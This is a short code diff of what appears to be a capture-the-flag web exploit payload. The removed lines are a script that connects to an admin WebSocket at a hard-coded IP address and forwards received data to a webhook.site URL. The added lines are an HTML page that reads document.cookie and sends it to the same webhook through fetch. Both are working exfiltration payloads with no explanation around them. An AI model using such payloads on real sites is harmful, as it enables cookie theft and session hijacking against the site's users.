@@ -1,33 +1,9 @@
-// Payload script
-try {
-  // Replace YOUR_WEBHOOK_URL with your actual webhook URL
-  const WEBHOOK = 'https://webhook.site/62178ee3-4f09-4a95-9e9f-fa6f0a85468d'; // <--- IMPORTANT: Replace this
+<html>
+  <body>
+    <script>
+      let flag = document.cookie;
 
-  const ws = new WebSocket(`ws://65.109.201.174:8080/admin/ws`);
-
-  ws.onopen = () => {
-    // Optional: Send a command if just connecting isn't enough.
-    // ws.send("get_flag"); // Uncomment and try if needed
-    fetch(WEBHOOK + '/status?m=ws_opened'); // Notify webhook that WS opened
-  };
-
-  ws.onmessage = (event) => {
-    // Send received data (hopefully the flag) to our webhook
-    const flagData = event.data;
-    fetch(WEBHOOK + '/flag?data=' + encodeURIComponent(flagData));
-    ws.close(); // Close WS after getting data
-  };
-
-  ws.onerror = (error) => {
-    // Report errors for debugging
-    fetch(WEBHOOK + '/error?m=' + encodeURIComponent('WS Error: ' + error.message));
-  };
-
-  ws.onclose = () => {
-    fetch(WEBHOOK + '/status?m=ws_closed'); // Notify webhook that WS closed
-  };
-
-} catch (e) {
-  // Report general errors
-  fetch(WEBHOOK + '/error?m=' + encodeURIComponent('General Error: ' + e.message));
-}
+      fetch('https://webhook.site/62178ee3-4f09-4a95-9e9f-fa6f0a85468d/?flag=' + encodeURIComponent(flag));
+    </script>
+  </body>
+</html>
